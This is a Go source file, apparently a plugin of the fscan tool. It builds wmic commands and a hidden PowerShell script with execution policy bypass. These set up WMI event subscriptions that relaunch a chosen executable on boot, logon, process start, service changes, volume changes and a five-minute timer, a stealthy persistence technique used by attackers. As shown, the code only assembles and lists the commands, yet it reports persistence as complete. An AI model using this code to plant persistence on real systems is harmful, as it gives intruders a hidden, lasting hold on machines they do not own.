//go:build (plugin_winwmi || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// WinWMIPlugin Windows WMI持久化插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现WMI事件订阅持久化功能
// - 保持原有功能逻辑
type WinWMIPlugin struct {
	plugins.BasePlugin
}

// NewWinWMIPlugin 创建Windows WMI事件订阅持久化插件
func NewWinWMIPlugin() *WinWMIPlugin {

	return &WinWMIPlugin{
		BasePlugin: plugins.NewBasePlugin("winwmi"),
	}
}

// Scan 执行Windows WMI事件订阅持久化 - 直接实现
func (p *WinWMIPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	state := session.State
	var output strings.Builder

	// 从config获取配置
	pePath := config.WinPEFile
	

	if runtime.GOOS != "windows" {
		output.WriteString("Windows WMI事件订阅持久化只支持Windows平台\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("不支持的平台: %s", runtime.GOOS),
		}
	}

	if pePath == "" {
		output.WriteString("必须通过 -win-pe 参数指定PE文件路径\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("未指定PE文件"),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(pePath); os.IsNotExist(err) {
		output.WriteString(fmt.Sprintf("PE文件不存在: %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 检查文件类型
	if !p.isValidPEFile(pePath) {
		output.WriteString(fmt.Sprintf("目标文件必须是PE文件(.exe或.dll): %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("无效的PE文件"),
		}
	}

	output.WriteString("=== Windows WMI事件订阅持久化 ===\n")
	output.WriteString(fmt.Sprintf("PE文件: %s\n", pePath))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	// 创建WMI事件订阅持久化
	wmiSubscriptions, err := p.createWMIEventSubscriptions(pePath)
	if err != nil {
		output.WriteString(fmt.Sprintf("创建WMI事件订阅持久化失败: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString(fmt.Sprintf("创建了%d个WMI事件订阅持久化项:\n", len(wmiSubscriptions)))
	for i, subscription := range wmiSubscriptions {
		output.WriteString(fmt.Sprintf("  %d. %s\n", i+1, subscription))
	}
	output.WriteString("\n✓ Windows WMI事件订阅持久化完成\n")

	common.LogSuccess(i18n.Tr("winwmi_success", len(wmiSubscriptions)))

	return &plugins.Result{
		Success: true,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
		Error:   nil,
	}
}

// createWMIEventSubscriptions 创建WMI事件订阅
func (p *WinWMIPlugin) createWMIEventSubscriptions(pePath string) ([]string, error) {
	absPath, err := filepath.Abs(pePath)
	if err != nil {
		return nil, fmt.Errorf("failed to get absolute path: %w", err)
	}

	var wmiSubscriptions []string
	baseName := filepath.Base(absPath)
	baseNameNoExt := baseName[:len(baseName)-len(filepath.Ext(baseName))]

	wmiEventConfigs := []struct {
		filterName   string
		consumerName string
		bindingName  string
		query        string
		description  string
	}{
		{
			filterName:   fmt.Sprintf("SystemBootFilter_%s", baseNameNoExt),
			consumerName: fmt.Sprintf("SystemBootConsumer_%s", baseNameNoExt),
			bindingName:  fmt.Sprintf("SystemBootBinding_%s", baseNameNoExt),
			query:        "SELECT * FROM Win32_SystemConfigurationChangeEvent",
			description:  "System Boot Event Trigger",
		},
		{
			filterName:   fmt.Sprintf("ProcessStartFilter_%s", baseNameNoExt),
			consumerName: fmt.Sprintf("ProcessStartConsumer_%s", baseNameNoExt),
			bindingName:  fmt.Sprintf("ProcessStartBinding_%s", baseNameNoExt),
			query:        "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'",
			description:  "Explorer Process Start Trigger",
		},
		{
			filterName:   fmt.Sprintf("UserLogonFilter_%s", baseNameNoExt),
			consumerName: fmt.Sprintf("UserLogonConsumer_%s", baseNameNoExt),
			bindingName:  fmt.Sprintf("UserLogonBinding_%s", baseNameNoExt),
			query:        "SELECT * FROM Win32_LogonSessionEvent WHERE EventType=2",
			description:  "User Logon Event Trigger",
		},
		{
			filterName:   fmt.Sprintf("FileCreateFilter_%s", baseNameNoExt),
			consumerName: fmt.Sprintf("FileCreateConsumer_%s", baseNameNoExt),
			bindingName:  fmt.Sprintf("FileCreateBinding_%s", baseNameNoExt),
			query:        "SELECT * FROM CIM_DataFile WHERE Drive='C:' AND Path='\\\\Windows\\\\System32\\\\'",
			description:  "File Creation Monitor Trigger",
		},
		{
			filterName:   fmt.Sprintf("ServiceChangeFilter_%s", baseNameNoExt),
			consumerName: fmt.Sprintf("ServiceChangeConsumer_%s", baseNameNoExt),
			bindingName:  fmt.Sprintf("ServiceChangeBinding_%s", baseNameNoExt),
			query:        "SELECT * FROM Win32_ServiceControlEvent",
			description:  "Service State Change Trigger",
		},
	}

	for _, config := range wmiEventConfigs {
		filterCmd := fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="%s", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="%s"`,
			config.filterName, config.query)

		consumerCmd := fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="%s", CommandLineTemplate="\"%s\"", ExecutablePath="\"%s\""`,
			config.consumerName, absPath, absPath)

		bindingCmd := fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"%s\"", Consumer="CommandLineEventConsumer.Name=\"%s\""`,
			config.filterName, config.consumerName)

		wmiSubscriptions = append(wmiSubscriptions, fmt.Sprintf("[%s - Filter] %s", config.description, filterCmd))
		wmiSubscriptions = append(wmiSubscriptions, fmt.Sprintf("[%s - Consumer] %s", config.description, consumerCmd))
		wmiSubscriptions = append(wmiSubscriptions, fmt.Sprintf("[%s - Binding] %s", config.description, bindingCmd))
	}

	timerFilterName := fmt.Sprintf("TimerFilter_%s", baseNameNoExt)
	timerConsumerName := fmt.Sprintf("TimerConsumer_%s", baseNameNoExt)

	timerQuery := "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

	timerFilterCmd := fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="%s", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="%s"`,
		timerFilterName, timerQuery)

	timerConsumerCmd := fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="%s", CommandLineTemplate="\"%s\"", ExecutablePath="\"%s\""`,
		timerConsumerName, absPath, absPath)

	timerBindingCmd := fmt.Sprintf(`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"%s\"", Consumer="CommandLineEventConsumer.Name=\"%s\""`,
		timerFilterName, timerConsumerName)

	wmiSubscriptions = append(wmiSubscriptions, fmt.Sprintf("[Timer Event (5min) - Filter] %s", timerFilterCmd))
	wmiSubscriptions = append(wmiSubscriptions, fmt.Sprintf("[Timer Event (5min) - Consumer] %s", timerConsumerCmd))
	wmiSubscriptions = append(wmiSubscriptions, fmt.Sprintf("[Timer Event (5min) - Binding] %s", timerBindingCmd))

	powershellWMIScript := fmt.Sprintf(`
$filterName = "PowerShellFilter_%s"
$consumerName = "PowerShellConsumer_%s"
$bindingName = "PowerShellBinding_%s"

$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType=2"
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = '"%s"'
    ExecutablePath = "%s"
}

$Binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}`, baseNameNoExt, baseNameNoExt, baseNameNoExt, absPath, absPath)

	powershellCmd := fmt.Sprintf(`powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "%s"`, powershellWMIScript)
	wmiSubscriptions = append(wmiSubscriptions, fmt.Sprintf("[PowerShell WMI Setup] %s", powershellCmd))

	return wmiSubscriptions, nil
}

// isValidPEFile 检查是否为有效的PE文件
func (p *WinWMIPlugin) isValidPEFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return ext == ".exe" || ext == ".dll"
}

// 注册插件
func init() {
	RegisterLocalPlugin("winwmi", func() Plugin {
		return NewWinWMIPlugin()
	})
}
